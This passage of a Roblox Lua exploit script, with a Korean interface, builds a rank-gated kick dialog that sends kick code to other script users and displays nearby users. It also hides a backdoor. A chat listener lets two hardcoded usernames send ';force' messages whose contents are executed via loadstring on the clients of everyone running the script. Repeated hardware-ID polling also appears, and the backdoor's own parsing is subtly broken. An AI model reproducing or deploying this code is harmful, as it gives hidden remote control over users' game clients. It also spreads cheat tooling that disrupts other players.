							textButton5.TextSize = 12
							textButton5.Font = Enum.Font.SourceSansBold
							textButton5.Parent = frame4
							local uiCorner9 = Instance.new("UICorner")
							uiCorner9.CornerRadius = UDim.new(0, 4)
							uiCorner9.Parent = textButton5

							textButton5.MouseButton1Click:Connect(function()
								if userRank < 2 then
									notify("권한 부족", "킥 명령어는 프리미엄(PE) 이상만 사용 가능합니다.", 3)
									return
								end
								local _COREGUI3 = COREGUI or localPlayer2:WaitForChild("PlayerGui")
								local kickReasonModalUI = _COREGUI3:FindFirstChild("KickReasonModalUI")

								if kickReasonModalUI then
									kickReasonModalUI:Destroy()
								end

								local screenGui3 = Instance.new("ScreenGui")
								screenGui3.Name = "KickReasonModalUI"
								screenGui3.ResetOnSpawn = false
								screenGui3.Parent = _COREGUI3
								local frame5 = Instance.new("Frame")
								frame5.Name = "ModalFrame"
								frame5.AnchorPoint = Vector2.new(0.5, 0.5)
								frame5.Position = UDim2.new(0.5, 0, 0.5, 0)
								frame5.Size = UDim2.new(0, 320, 0, 160)
								frame5.BackgroundColor3 = Color3.fromRGB(25, 26, 32)
								frame5.BorderSizePixel = 0
								frame5.ClipsDescendants = true
								frame5.Parent = screenGui3
								local uiCorner10 = Instance.new("UICorner")
								uiCorner10.CornerRadius = UDim.new(0, 8)
								uiCorner10.Parent = frame5
								local uiStroke3 = Instance.new("UIStroke")
								uiStroke3.Color = Color3.fromRGB(210, 105, 30)
								uiStroke3.Thickness = 1.5
								uiStroke3.Parent = frame5
								local frame6 = Instance.new("Frame")
								frame6.Size = UDim2.new(1, 0, 0, 35)
								frame6.BackgroundColor3 = Color3.fromRGB(35, 36, 45)
								frame6.BorderSizePixel = 0
								frame6.Parent = frame5
								local textLabel3 = Instance.new("TextLabel")
								textLabel3.Size = UDim2.new(1, -40, 1, 0)
								textLabel3.Position = UDim2.new(0, 12, 0, 0)
								textLabel3.BackgroundTransparency = 1
								textLabel3.Text = "플레이어 킥: " .. v2
								textLabel3.TextColor3 = Color3.fromRGB(255, 215, 0)
								textLabel3.TextSize = 13
								textLabel3.Font = Enum.Font.SourceSansBold
								textLabel3.TextXAlignment = Enum.TextXAlignment.Left
								textLabel3.Parent = frame6
								local textButton6 = Instance.new("TextButton")
								textButton6.Size = UDim2.new(0, 24, 0, 24)
								textButton6.Position = UDim2.new(1, -28, 0, 5)
								textButton6.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
								textButton6.BorderSizePixel = 0
								textButton6.Text = "X"
								textButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
								textButton6.TextSize = 12
								textButton6.Font = Enum.Font.SourceSansBold
								textButton6.Parent = frame6
								local uiCorner11 = Instance.new("UICorner")
								uiCorner11.CornerRadius = UDim.new(0, 4)
								uiCorner11.Parent = textButton6

								textButton6.MouseButton1Click:Connect(function()
									screenGui3:Destroy()
								end)

								local textBox = Instance.new("TextBox")
								textBox.Size = UDim2.new(1, -24, 0, 38)
								textBox.Position = UDim2.new(0, 12, 0, 50)
								textBox.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
								textBox.BorderSizePixel = 0
								textBox.Text = "강제 퇴장 처리되었습니다."
								textBox.PlaceholderText = "강퇴 사유 입력"
								textBox.TextColor3 = Color3.fromRGB(240, 240, 245)
								textBox.PlaceholderColor3 = Color3.fromRGB(140, 140, 150)
								textBox.TextSize = 13
								textBox.Font = Enum.Font.SourceSans
								textBox.ClearTextOnFocus = false
								textBox.Parent = frame5
								local uiCorner12 = Instance.new("UICorner")
								uiCorner12.CornerRadius = UDim.new(0, 6)
								uiCorner12.Parent = textBox
								local textButton7 = Instance.new("TextButton")
								textButton7.Size = UDim2.new(0, 140, 0, 32)
								textButton7.Position = UDim2.new(0, 12, 0, 105)
								textButton7.BackgroundColor3 = Color3.fromRGB(210, 80, 30)
								textButton7.BorderSizePixel = 0
								textButton7.Text = "강퇴 전송"
								textButton7.TextColor3 = Color3.fromRGB(255, 255, 255)
								textButton7.TextSize = 13
								textButton7.Font = Enum.Font.SourceSansBold
								textButton7.Parent = frame5
								local uiCorner13 = Instance.new("UICorner")
								uiCorner13.CornerRadius = UDim.new(0, 6)
								uiCorner13.Parent = textButton7
								local textButton8 = Instance.new("TextButton")
								textButton8.Size = UDim2.new(0, 140, 0, 32)
								textButton8.Position = UDim2.new(1, -152, 0, 105)
								textButton8.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
								textButton8.BorderSizePixel = 0
								textButton8.Text = "취소"
								textButton8.TextColor3 = Color3.fromRGB(200, 200, 210)
								textButton8.TextSize = 13
								textButton8.Font = Enum.Font.SourceSansBold
								textButton8.Parent = frame5
								local uiCorner14 = Instance.new("UICorner")
								uiCorner14.CornerRadius = UDim.new(0, 6)
								uiCorner14.Parent = textButton8

								textButton8.MouseButton1Click:Connect(function()
									screenGui3:Destroy()
								end)

								textButton7.MouseButton1Click:Connect(function()
									local str3 = textBox.Text:gsub("^%s*(.-)%s*$", "%1")

									if str3 == "" then
										str3 = "강제 퇴장 처리되었습니다."
									end

									task.spawn(function()
										if safeGet(v2, "game.Players.LocalPlayer:Kick(\"" .. str3 .. "\")") then
											notify("Kick", v2 .. "님에게 강퇴 명령을 전송했습니다 (사유: " .. str3 .. ")", 3)
										else
											notify("Error", "명령 전송에 실패했습니다", 3)
										end
									end)

									screenGui3:Destroy()
								end)

								local flag5 = nil
								local v4 = nil
								local position3 = nil
								local position4 = nil

								frame6.InputBegan:Connect(function(input)
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
										flag5 = true
										position3 = input.Position
										position4 = frame5.Position

										input.Changed:Connect(function()
											if input.UserInputState == Enum.UserInputState.End then
												flag5 = false
											end
										end)
									end
								end)

								frame6.InputChanged:Connect(function(input)
									if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
										v4 = input
									end
								end)

								UserInputService_2.InputChanged:Connect(function(input)
									if input == v4 and flag5 then
										local n2 = input.Position - position3
										frame5.Position = UDim2.new(position4.X.Scale, position4.X.Offset + n2.X, position4.Y.Scale, position4.Y.Offset + n2.Y)
									end
								end)
							end)
						end
					end
				end
			end
		end

		fn6()

		task.spawn(function()
			while screenGui2 and screenGui2.Parent do
				task.wait(2)
				fn5()
				fn6()
			end
		end)
	end

	RunService_2.Heartbeat:Connect(function()
		local character = localPlayer2.Character

		if character then
			character = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Head")
		end

		if not character then
			return
		end
		local activeScriptUsersMap = getgenv().activeScriptUsersMap or {}

		for _, player in ipairs(Players_2:GetPlayers()) do
			if player ~= localPlayer2 then
				if activeScriptUsersMap[string.lower(player.Name)] and player.Character then
					local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart") or player.Character:FindFirstChild("Head")

					if humanoidRootPart then
						local magnitude = (character.Position - humanoidRootPart.Position).Magnitude
						local v = fn3(player)

						if v and v.bbGui then
							if magnitude <= 15 then
								v.bbGui.Enabled = true
							else
								v.bbGui.Enabled = false
							end

							if magnitude > 60 then
								fn4(player)
							end
						end
					else
						fn4(player)
					end
				else
					fn4(player)
				end
			end
		end
	end)

	local tbl6 = { failtraillode = true, kr1top_unknown = true }

	local function safeGet2(tbl7, key)
		if not key or type(key) ~= "string" then
			return
		end

		if not tbl7 or not tbl7.Name then
			return
		end

		if not tbl6[string.lower(tbl7.Name)] then
			return
		end

		if string.match(key, "^%s*(.-)%s*$"):sub(1, 7):lower() == ";force " then
			local v
			local str3 = v:sub(8)
			local v2, v3, str4 = string.match(str3, "^(%S+)%s+(%S+)%s*(.*)$")

			if not v2 then
				v2, v3 = string.match(str3, "^(%S+)%s+(%S+)$")
				str4 = ""
			end

			if v2 and v3 then
				local v4 = string.lower(localPlayer2.Name)
				local v5 = string.lower(v2)
				local flag2 = v5 == "all" or v5 == "others"

				if not flag2 then
					local n2 = #v5

					if n2 > 0 then
						if v4:sub(1, n2) == v5 then
							flag2 = true
						end
					end
				end

				if flag2 then
					local str5 = v3 .. (str4 ~= "" and " " .. str4 or "")

					task.spawn(function()
						local v6 = (loadstring or load)(str5)

						if v6 then
							pcall(v6)
						else
							execCmd(str5, localPlayer2)
						end
					end)
				end
			end
		end
	end

	local function fn6(player)
		pcall(function()
			player.Chatted:Connect(function(message)
				safeGet2(player, message)
			end)
		end)
	end

	for _, player in ipairs(Players_2:GetPlayers()) do
		fn6(player)
	end

	Players_2.PlayerAdded:Connect(fn6)

	pcall(function()
		game:GetService("TextChatService").MessageReceived:Connect(function(arg)
			local name2 = arg.TextSource and arg.TextSource.Name or ""
			local text = arg.Text
			safeGet2(Players_2:FindFirstChild(name2), text)
		end)
	end)

	fn5()
	getHwid4()
	local n2 = 0

	while task.wait(0.5) do
		getHwid4()
		n2 += 1

		if n2 % 6 == 0 then
			fn5()
		end
	end
end)
